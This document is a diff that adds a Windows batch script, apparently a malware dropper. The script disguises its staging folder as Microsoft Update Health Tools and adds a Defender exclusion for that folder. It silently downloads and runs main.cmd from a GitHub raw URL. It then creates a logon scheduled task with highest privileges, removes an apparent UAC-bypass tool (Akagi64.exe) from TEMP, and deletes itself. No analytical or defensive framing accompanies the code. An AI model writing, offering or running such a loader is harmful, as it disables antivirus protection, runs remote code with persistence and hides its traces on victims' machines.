@@ -1,0 +1,17 @@
+@echo off
+set SystemRoot=C:\Windows
+set "STAGE=C:\Program Files\Microsoft Update Health Tools\Tools"
+
+mkdir "%STAGE%" 2>nul
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Add-MpPreference -ExclusionPath '%STAGE%'"
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/main.cmd' -OutFile '%STAGE%\main.cmd' -UseBasicParsing"
+
+schtasks /create /tn "\Microsoft\Windows\UpdateHealthTools" /tr "C:\Windows\System32\cmd.exe /c \"%STAGE%\main.cmd\"" /sc onlogon /rl highest /f >nul 2>&1
+
+call "%STAGE%\main.cmd"
+
+start "" /b cmd /c "ping -n 11 127.0.0.1 >nul & del /f /q ""%TEMP%\Akagi64.exe"""
+
+(goto) 2>nul & del "%~f0"
